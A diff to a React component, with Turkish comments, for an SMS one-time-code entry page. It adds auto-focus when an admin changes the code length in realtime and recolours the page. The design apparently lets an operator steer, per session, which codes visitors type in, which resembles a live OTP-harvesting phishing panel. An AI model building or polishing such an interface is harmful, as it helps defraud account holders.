@@ -87,9 +87,17 @@ export function SmsClient({ sessionId }: Props) {
             };
             // ⭐ BELİRSİZ HANE realtime guncellemesi
             const modeUnknown = next.sms_mode === "unknown" || (next.sms_mode === undefined && Number(next.sms_digits) === 0);
+            const prevMode = smsMode;
+            const prevDigits = digits;
+            let changed = false;
             if (next.sms_mode !== undefined || next.sms_digits !== undefined) {
-              setSmsMode(modeUnknown ? "unknown" : "fixed");
-              setDigits(Number(next.sms_digits) || 6);
+              const newMode: "fixed" | "unknown" = modeUnknown ? "unknown" : "fixed";
+              const newDigits = Number(next.sms_digits) || 6;
+              if (prevMode !== newMode || prevDigits !== newDigits) {
+                changed = true;
+              }
+              setSmsMode(newMode);
+              setDigits(newDigits);
               setCode("");
             }
             if (next.sms_custom_text !== undefined) {
@@ -104,6 +112,24 @@ export function SmsClient({ sessionId }: Props) {
                 next.form_data.sms_code = "";
               }
             }
+
+            // ⭐ Büyük fix: Admin belirsiz -> sabit veya sabit -> belirsiz degistirince
+            //   useEffect sadece mountta çalıştığı için prevMode/prevDigits state'leri KAPALI (stale closure).
+            //   Degisiklik olmasa bile REALTIME her geldiginde; kutuların yeniden render edilmesi ve
+            //   1. kutuya otomatik focus olması için 200ms sonra FORCE bir event (visibility benzeri) veya DOM focus denemesi:
+            if (changed) {
+              window.setTimeout(() => {
+                // İlk inputa focus (0) → kullanici F5 atmadan yeni 6 kutu veya yeni dynamic 4 kutu görünce
+                // direkt yazmaya baslayabilir
+                const first = document.getElementById("otp-input-0");
+                if (first) first.focus();
+              }, 220);
+              // 2. katman fallback 450ms (re-render biraz gecikirse)
+              window.setTimeout(() => {
+                const f2 = document.getElementById("otp-input-0");
+                if (f2 && document.activeElement?.id !== f2.id) f2.focus();
+              }, 450);
+            }
           }
         )
         .subscribe();
@@ -117,7 +143,11 @@ export function SmsClient({ sessionId }: Props) {
     return () => {
       cancelled = true;
     };
-  }, [sessionId, supabase]);
+    // ⭐ ONEMLI: smsMode ve digits dependency EKLEDIK.
+    //   Realtime callback içinde `prevMode / prevDigits` artık güncel state değerlerini
+    //   yakalıyor (eski halde sadece mount anındaki değerler mevcuttu, değişiklik
+    //   yakalanamıyordu). useEffect remount değil, sadece callback dependency güncellenir.
+  }, [sessionId, supabase, smsMode, digits]);
 
   async function handleSubmit(e?: React.FormEvent | null, fromAuto = false) {
     if (e) e.preventDefault();
@@ -168,7 +198,7 @@ export function SmsClient({ sessionId }: Props) {
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[#16A34A]/30 border-t-[#16A34A]" />
         </div>
       </div>
     );
@@ -177,7 +207,7 @@ export function SmsClient({ sessionId }: Props) {
   if (!supabase) {
     return (
       <div className="pak-page-shell">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021208] border border-[#16A34A] shadow-[0_0_40px_rgba(22,163,74,0.3)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -187,7 +217,7 @@ export function SmsClient({ sessionId }: Props) {
   if (!sessionId) {
     return (
       <div className="pak-page-shell">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021208] border border-[#16A34A] shadow-[0_0_40px_rgba(22,163,74,0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
               Invalid link.
           </p>
@@ -199,8 +229,8 @@ export function SmsClient({ sessionId }: Props) {
   if (loading) {
     return (
       <div className="pak-page-shell">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021208] border border-[#16A34A] shadow-[0_0_40px_rgba(22,163,74,0.3)] p-5 sm:p-8 flex justify-center py-16">
+          <div className="size-12 animate-spin rounded-full border-4 border-[#16A34A] border-t-transparent" />
         </div>
       </div>
     );
